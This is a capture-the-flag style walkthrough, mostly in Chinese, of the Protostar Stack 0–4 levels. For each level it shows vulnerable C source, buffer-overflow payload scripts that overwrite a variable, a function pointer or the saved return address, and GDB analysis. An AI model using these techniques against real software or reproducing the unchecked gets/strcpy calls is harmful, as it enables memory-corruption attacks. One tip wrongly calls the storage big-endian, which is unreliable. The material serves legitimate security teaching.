# Protostar: Stack 0

This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at `/opt/protostar/bin/stack0`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```



## 攻击目标

使程序输出`you have changed the 'modified' variable`。



## 攻击过程

```shell
$ ./stack0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa	#64个A
```

<img src=".\stack0-result.png" style="zoom:67%;" />



## 原理分析

分析源码可知，程序在正常情况下的输出结果应该是 `Try again?`。

在GDB中执行反汇编指令，得到汇编代码：

```shell
(gdb) set disassembly-flavor intel #设置汇编代码偏好为intel
(gdb) disassemble main
```

<img src=".\stack0-disassemble.png" style="zoom: 67%;" />

分析汇编代码，可知：

```shell
0x080483fa <main+6>:	sub	esp,0x60	#在栈上开辟了0x60B的空间（esp指向栈顶）。
0x080483fa <main+9>:	mov	DWORD PTR [esp+0x5c],0x0	#在esp下方0x5c处给modified分配了4B（一个int类型变量为4B）的空间，并赋值为0。
0x080483fa <main+17>:	lea	eax,[esp+0x1c]	#在esp下方0x1c处给`buffer`分配了64B（一个char类型变量为1B）的空间。
```

<img src=".\stack0-analysis.png" style="zoom: 67%;" />

然而，c语言的`gets()`函数不会对输入的内容进行检查，因此，如果输入了超过64B的内容，超出`buffer`的部分将会溢出到`modified`。

在leave指令处打一个断点。运行程序，输入任意64B以内的字符串，然后查看栈上的内容（0x41为字符"A"的ASCII码），可以看到`modified`的值没有被改变。

<img src=".\stack0-analysis-1.png" style="zoom: 67%;" />

重新运行程序，输入超过64B的字符串，再次查看栈上的内容，可以看到`modified`的值被改变了。

<img src=".\stack0-analysis-2.png" style="zoom:67%;" />

综上所述，需要向`buffer`中输入超过64B的内容，才能改变`modified`的值，使程序输出`you have changed the 'modified' variable`。

<div STYLE="page-break-after: always;"></div>

# Protostar: Stack 1

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at `/opt/protostar/bin/stack1`.

> **Hints**
>
> - If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
> - Protostar is little endian.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    if(argc == 1) {
        errx(1, "please specify an argument\n");
    }

    modified = 0;
    strcpy(buffer, argv[1]);

    if(modified == 0x61626364) {
        printf("you have correctly got the variable to the right value\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }
}
```



## 攻击目标

使程序输出`you have correctly got the variable to the right value`。



## 攻击过程

```shell
$ cat stack1_argv1.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba	#64个A；a、b、c、d对应的ASCII码即为0x61、0x62、0x63、0x64
$ ./stack1 `cat stack1_argv1.txt`
```

<img src=".\stack1-result.png" style="zoom:67%;" />

> Tip：使用Vim编辑器准备攻击脚本的过程省略。需要注意的是，程序中的数值在内存中以大端法存储，所以脚本最后四位应为dcba而不是abcd。



## 原理分析

分析源码可知，程序在正常情况下的输出结果应该是 `Try again, you got 0x00000000`。

同样的，在GDB中得到汇编代码：

<img src=".\stack1-disassemble.png" style="zoom:67%;" />

分析汇编代码，可知：

```shell
0x0804846a <main+6>:	sub	esp,0x60	#在栈上开辟了0x60B的空间（esp指向栈顶）。
...
0x08048487 <main+35>:	mov	DWORD PTR [esp+0x5c],0x0	#在esp下方0x5c处给modified分配了4B（一个int类型变量为4B）的空间，并赋值为0。
...
0x0804849b <main+55>:	lea	eax,[esp+0x1c]	#在esp下方0x1c处给buffer分配了64B（一个char类型变量为1B）的空间。
```

<img src=".\stack0-analysis.png" style="zoom: 67%;" />

c语言的`strcpy()`函数不会对复制的内容进行检查，如果复制了超过64B的内容，超出`buffer`的部分将会溢出到`modified`。

在leave指令处打一个断点。运行程序，输入任意64B以内的字符串，然后查看栈上的内容（0x41为字符"A"的ASCII码），可以看到`modified`的值没有被改变。

<img src=".\stack1-analysis-1.png" style="zoom:67%;" />

重新运行程序，以准备好的攻击文件`stack1_argv1.txt`作为输入，再次查看栈上的内容，可以看到`modified`的值被改变了。

<img src=".\stack1-analysis-2.png" style="zoom:67%;" />

综上所述，需要将`argv[1]`的值设置为64个任意字符+dcba，才能指定`modified`的值为0x61626364，使程序输出`you have correctly got the variable to the right value`。

<div STYLE="page-break-after: always;"></div>

# Protostar: Stack 2

Stack2 looks at environment variables, and how they can be set.

This level is at `/opt/protostar/bin/stack2`.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    char *variable;

    variable = getenv("GREENIE");

    if(variable == NULL) {
        errx(1, "please set the GREENIE environment variable\n");
    }

    modified = 0;

    strcpy(buffer, variable);

    if(modified == 0x0d0a0d0a) {
        printf("you have correctly modified the variable\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }
}
```



## 攻击目标

使程序输出`you have correctly modified the variable`。



## 攻击过程

```shell
$ cat stack2_new_env.py
buffer = "A"*64
mod = "\x0a\x0d\x0a\x0d"
new_env = buffer + mod
print new_env
$ export GREENIE=`python stack2_new_env.py`	#设置环境变量
$ echo $GREENIE	#查看环境变量
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA	#64个A，最后4个字符为不可见字符
$ ./stack2
```

<img src=".\stack2-result.png" style="zoom:67%;" />



## 原理分析

分析源码可知，程序在正常情况下的输出结果应该是 `Try again, you got 0x00000000`。

同样的，在GDB中得到汇编代码：

<img src=".\stack2-disassemble.png" style="zoom:67%;" />

分析汇编代码，可知：

```shell
0x0804849a <main+6>:	sub	esp,0x60	#在栈上开辟了0x60B的空间（esp指向栈顶）。
..
0x080484a9 <main+21>:	mov	DWORD PTR [esp+0x5c],eax	#在esp下方0x5c处给*variable分配了4B（一个指针为4B）的空间，并让它指向GREENIE。
...
0x080484c8 <main+52>:	mov	DWORD PTR [esp+0x58],0x0	#在esp下方0x58处给modified分配了4B（一个int类型变量为4B）的空间，并赋值为0。
...
0x080484d8 <main+68>:	lea	eax,[esp+0x18]	#在esp下方0x1c处给buffer分配了64B（一个char类型变量为1B）的空间。
```

<img src=".\stack2-analysis.png" style="zoom: 67%;" />

c语言的`strcpy()`函数不会对复制的内容进行检查，如果复制了超过64B的内容，超出`buffer`的部分将会溢出到`modified`。

在`strcpy()`函数对应的指令处打一个断点。

<img src=".\stack2-analysis-1.png" style="zoom: 67%;" />

运行程序，查看栈上的内容，可以看到在`strcpy()`执行前，`modified`的值还没有被改变。

<img src=".\stack2-analysis-2.png" style="zoom:67%;" />

继续运行，在`strcpy()`执行后（将`*variable`指向的GREENIE的值复制到`buffer`，GREENIE的值已由攻击脚本`stack2_new_env.py`写入），再次查看栈上的内容，可以看到此时`modified`的值被改变了。

<img src=".\stack2-analysis-3.png" style="zoom:67%;" />

综上所述，需要将环境变量`GREENIE`的值设置为64个任意字符+"\x0a\x0d\x0a\x0d"（利用Python脚本写入），才能指定`modified`的值为0x0d0a0d0a，使程序输出`you have correctly modified the variable`。

<div STYLE="page-break-after: always;"></div>

# Protostar: Stack 3

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP).

This level is at `/opt/protostar/bin/stack3`.

> **Hints**
>
> - both gdb and objdump is your friend you determining where the win() function lies in memory.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    volatile int (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp) {
        printf("calling function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
}
```



## 攻击目标

使程序输出`calling function pointer, jumping to 0x08048424`，然后输出`code flow successfully changed`。



## 攻击过程

```shell
$ cat stack3_win.py
buffer = "A"*64
mod = "\x24\x84\x04\x08"
win = buffer + mod
print win
$ python stack3_win.py > stack3_win.txt	#写入txt文件
$ cat stack3_win.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$    	#64个A，最后3个字符为不可见字符
$ ./stack3 < stack3_win.txt
```

<img src=".\stack3-result.png" style="zoom:67%;" />



## 原理分析

分析源码可知，程序在正常情况下不会输出任何结果。

同样的，在GDB中得到汇编代码：

<img src=".\stack3-disassemble.png" style="zoom:67%;" />

分析汇编代码，可知：

```shell
0x0804843e <main+6>:	sub	esp,0x60	#在栈上开辟了0x60B的空间（esp指向栈顶）。
0x08048441 <main+9>:	mov	DWORD PTR [esp+0x5c],0x0	#在esp下方0x5c处给fp分配了4B（一个指针为4B）的空间，并赋值为0。
0x08048449 <main+17>:	lea	eax,[esp+0x1c]	#在esp下方0x1c处给buffer分配了64B（一个char类型变量为1B）的空间。
```

<img src=".\stack3-analysis.png" style="zoom: 67%;" />

然而，c语言的`gets()`函数不会对输入的内容进行检查，因此，如果输入了超过64B的内容，超出`buffer`的部分将会溢出到`*fp`。

查看`win()`函数的地址（在攻击脚本`stack3_win.py`中被利用）。

<img src=".\stack3-analysis-1.png" style="zoom: 67%;" />

在leave指令处打一个断点。运行程序，输入任意64B以内的字符串，然后查看栈上的内容（0x41为字符"A"的ASCII码），可以看到`fp`的值没有被改变。

<img src=".\stack3-analysis-2.png" style="zoom:67%;" />

重新运行程序，以准备好的攻击文件`stack3_win.txt`（由攻击脚本`stack3_win.py`写入）作为输入，再次查看栈上的内容，可以看到`fp`的值被改变为`win()`函数的地址。

<img src=".\stack3-analysis-3.png" style="zoom:67%;" />

综上所述，需要向`buffer`中输入64个任意字符+`win()`函数的地址，才能让`*fp`指向`win()`的地址，使程序进入if分支，输出`calling function pointer, jumping to 0x08048424`，然后执行`*fp`指向的函数——`win()`函数，输出`code flow successfully changed`。

<div STYLE="page-break-after: always;"></div>

# Protostar: Stack 4

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at `/opt/protostar/bin/stack4`.

> **Hints**
>
> - A variety of introductory papers into buffer overflows may help.
> - gdb lets you do “run < input”.
> - EIP is not directly after the end of buffer, compiler padding can also increase the size.

### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    char buffer[64];

    gets(buffer);
}
```



## 攻击目标

使程序输出`code flow successfully changed`。



## 攻击过程

```shell
$ cat stack4_win.py
buffer = "A"*76
mod = "\xf4\x83\x04\x08"
win = buffer + mod
print win
$ python stack4_win.py > stack4_win.txt	#写入txt文件
$ cat stack4_win.txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    	#76个A，最后4个字符为不可见字符
$ ./stack4 < stack4_win.txt
```

<img src=".\stack4-result.png" style="zoom:67%;" />



## 原理分析

分析源码可知，程序在正常情况下不会输出任何结果。

同样的，在GDB中得到汇编代码：

<img src=".\stack4-disassemble.png" style="zoom:67%;" />

分析汇编代码，可知：

```shell
0x0804840e <main+6>:	sub	esp,0x50	#在栈上开辟了0x50B的空间（esp指向栈顶）。
0x08048411 <main+9>:	lea	eax,[esp+0x10]	#在esp下方0x10处给buffer分配了64B（一个char类型变量为1B）的空间。
```

然而，c语言的`gets()`函数不会对输入的内容进行检查，因此，如果输入了超过64B的内容，超出`buffer`的部分将向下溢出。

程序执行时的栈空间变化与寄存器指向逻辑如图：

<img src=".\stack4-analysis-0.png" style="zoom:67%;" />

所以需要利用`buffer`溢出的漏洞将ret返回的地址覆盖为`win()`的地址。

查看`win()`函数的地址（在攻击脚本`stack4_win.py`中被利用）。

<img src=".\stack4-analysis-1.png" style="zoom:67%;" />

在leave指令处打一个断点。运行程序，输入任意64B以内的字符串，然后查看栈上的内容（0x41为字符"A"的ASCII码）。

<img src=".\stack4-analysis-2.png" style="zoom:67%;" />

继续运行，查看eip寄存器的值。

<img src=".\stack4-analysis-3.png" style="zoom:67%;" />

当前eip寄存器的值为0xb7eadc76，即，执行了ret指令后，程序回到了0xb7eadc76处继续执行之后的命令。可以在之前的栈里找到这个位置。

<img src=".\stack4-analysis-4.png" style="zoom:67%;" />

继续运行，程序正常返回。

<img src=".\stack4-analysis-5.png" style="zoom:67%;" />

根据计算，需要向`buffer`中输入76个字符+`win()`函数的地址，才能恰好将原来的返回地址覆盖为`win()`函数的地址。

重新运行程序，以准备好的攻击文件`stack4_win.txt`（由攻击脚本`stack4_win.py`写入）作为输入，再次查看栈上的内容，可以看到此时返回地址对应位置的值被改变为`win()`函数的地址。

<img src=".\stack4-analysis-6.png" style="zoom:67%;" />

继续运行程序，可以看到程序进入了`win()`函数。最终发生了段错误。

<img src=".\stack4-analysis-7.png" style="zoom:67%;" />

综上所述，需要向`buffer`中输入76个字符+`win()`函数的地址，才能恰好将原来ret返回的地址覆盖为`win()`函数的地址，使程序执行了ret指令后，eip跳转到`win()`函数的地址，执行`win()`，并输出`code flow successfully changed`。
